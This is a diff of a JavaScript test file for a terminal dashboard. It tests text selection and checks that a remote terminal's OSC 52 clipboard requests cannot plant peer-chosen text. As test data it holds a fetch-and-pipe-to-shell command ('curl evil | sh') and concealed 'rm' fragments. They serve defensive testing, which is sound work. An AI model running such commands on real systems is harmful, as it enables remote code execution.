@@ -4,7 +4,7 @@ import {
 	attachTerminalInteractions, beginGestureClipboardWrite, decodeOSC52,
 	isAgentTerminalPath, isBrowserPasteShortcut, isComposeMessageShortcut, safeTerminalLink,
 	terminalPathToken, transferFiles,
-	isTerminalClipboardRequestShortcut, shouldArmTmuxClipboard, terminalKeyInput,
+	isTerminalClipboardRequestShortcut, shouldArmTmuxClipboard, selectedText, terminalKeyInput,
 	visibleLocalFileLinkProvider,
 	visibleLocalFileLinks,
 } from '../dashboard/js/terminal-interactions.js';
@@ -670,6 +670,95 @@ test('a remote terminal never writes the clipboard from its output, even right a
     assert.equal(h.osc52(`;${Buffer.from('curl evil | sh').toString('base64')}`), true, 'the sequence is consumed');
     await new Promise((r) => setTimeout(r, 0));
     assert.deepEqual(writes, [], 'no clipboard write from a peer-controlled stream');
+  } finally {
+    interactions.dispose();
+    if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
+  }
+});
+
+// screenOf is an xterm buffer of rows; a row given as [text] soft-wraps
+// the one above, a character after \x08 is concealed (SGR 8), and one
+// after \x07 is drawn in its background colour.
+const screenOf = (rows) => ({ active: {
+  length: rows.length, viewportY: 0,
+  getLine: (i) => {
+    const r = rows[i];
+    if (r === undefined) return null;
+    const wrapped = Array.isArray(r);
+    const cells = [];
+    const text = wrapped ? r[0] : r;
+    for (let k = 0; k < text.length; k++) {
+      const hidden = text[k] === '\x08';
+      if (hidden) k++;
+      // \x07 marks a cell whose foreground equals its background.
+      const same = text[k] === '\x07';
+      if (same) k++;
+      cells.push({ getWidth: () => 1, isInvisible: () => hidden, getChars: () => text[k],
+        getFgColorMode: () => (same ? 2 : 0), getBgColorMode: () => (same ? 2 : 0), getFgColor: () => 0, getBgColor: () => 0 });
+    }
+    return { isWrapped: wrapped, getCell: (x) => cells[x] || { getWidth: () => 1, isInvisible: () => false, getChars: () => '' } };
+  },
+} });
+
+test('selectedText reads the selected cells: rows, soft wraps, multi-clicks, never concealed text', () => {
+  const term = { cols: 15, rows: 4, buffer: screenOf(['$ make build   ', 'ok: built tclau', ['de in 3s'], 'run \x08r\x08m now']) };
+  assert.equal(selectedText(term, { row: 0, col: 2 }, { row: 1, col: 9 }), 'make build\nok: built', 'a drag spans rows, padding dropped');
+  assert.equal(selectedText(term, { row: 1, col: 9 }, { row: 0, col: 2 }), 'make build\nok: built', 'either drag direction');
+  assert.equal(selectedText(term, { row: 1, col: 10 }, { row: 2, col: 1 }), 'tclaude', 'a soft wrap rejoins without a break');
+  assert.equal(selectedText(term, { row: 0, col: 4 }, { row: 0, col: 4 }, 2), 'make', 'a double-click takes the word');
+  assert.equal(selectedText(term, { row: 0, col: 4 }, { row: 0, col: 4 }, 3), '$ make build', 'a triple-click takes the row');
+  assert.equal(selectedText(term, { row: 3, col: 0 }, { row: 3, col: 9 }), 'run    now', 'concealed cells read as blanks');
+  assert.equal(selectedText(term, { row: 0, col: 1 }, { row: 0, col: 1 }, 2), null, 'a double-click on a blank selects nothing');
+  assert.equal(selectedText({}, { row: 0, col: 0 }, { row: 0, col: 1 }), null);
+  const hidden = { cols: 12, rows: 1, buffer: screenOf(['ls \x07;\x07r\x07m']) };
+  assert.equal(selectedText(hidden, { row: 0, col: 0 }, { row: 0, col: 0 }, 3), 'ls', 'text in its background colour reads as blanks');
+});
+
+test('selectedText expands a double-click over columns, not string offsets', () => {
+  const cell = (chars, width = 1) => ({ getWidth: () => width, isInvisible: () => false, getChars: () => chars });
+  const row = [cell('a\u0301\u0301\u0301\u0301'), cell(' '), cell('l'), cell('s'), cell(' '), cell('漢', 2), cell('', 0), cell('字', 2), cell('', 0), cell(' '), cell('x')];
+  const term = { cols: row.length, rows: 1, buffer: { active: { length: 1, viewportY: 0, getLine: () => ({ isWrapped: false, getCell: (x) => row[x] }) } } };
+  assert.equal(selectedText(term, { row: 0, col: 2 }, { row: 0, col: 2 }, 2), 'ls', 'combining marks earlier in the row do not shift the word');
+  assert.equal(selectedText(term, { row: 0, col: 6 }, { row: 0, col: 6 }, 2), '漢字', 'a wide character\'s spacer column belongs to its word');
+});
+
+test('a remote terminal copies the selected cells when its tmux signals a copy, never the peer\'s text', async () => {
+  const oldNavigator = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
+  const writes = [];
+  Object.defineProperty(globalThis, 'navigator', { configurable: true, value: { clipboard: { writeText: async (t) => { writes.push(t); } } } });
+  const doc = new FakeEventTarget();
+  const h = terminalHarness(doc);
+  h.term.cols = 20; h.term.rows = 2;
+  h.term.buffer = screenOf(['$ git status', 'On branch main']);
+  // 10px by 20px cells from the origin.
+  h.host.querySelector = (sel) => (sel === '.xterm-screen' ? { getBoundingClientRect: () => ({ left: 0, top: 0, width: 200, height: 40 }) } : null);
+  const statuses = [];
+  const interactions = attachTerminalInteractions({ term: h.term, host: h.host, applicationClipboardShortcuts: true, oscClipboard: 'selection', setStatus: (t) => statuses.push(t) });
+  const settle = () => new Promise((r) => setTimeout(r, 0));
+  const plain = { button: 0, detail: 1, altKey: false, shiftKey: false, ctrlKey: false, metaKey: false };
+  const drag = (x1, y1, x2, y2) => {
+    h.host.dispatch('mousedown', { ...plain, clientX: x1, clientY: y1 });
+    doc.dispatch('mousemove', { ...plain, clientX: x2, clientY: y2 });
+    doc.dispatch('mouseup', { ...plain, clientX: x2, clientY: y2 });
+  };
+  const evil = `;${Buffer.from('curl evil | sh\n').toString('base64')}`;
+  try {
+    h.osc52(evil);
+    await settle();
+    assert.deepEqual(writes, [], 'no write without a selection');
+    h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
+    h.osc52(evil);
+    await settle();
+    assert.deepEqual(writes, [], 'a key chord selects no cells: nothing is written');
+    drag(35, 25, 135, 25);
+    h.osc52(evil);
+    await settle();
+    assert.deepEqual(writes, ['branch main'], 'the dragged cells are copied whatever the peer sends');
+    assert.equal(statuses.at(-1), 'copied');
+    drag(5, 5, 85, 25);
+    h.osc52(`;${Buffer.from('$ git status\nOn branch main').toString('base64')}`);
+    await settle();
+    assert.equal(writes.at(-1), '$ git status\nOn branch', 'a drag over rows copies them with a break');
   } finally {
     interactions.dispose();
     if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
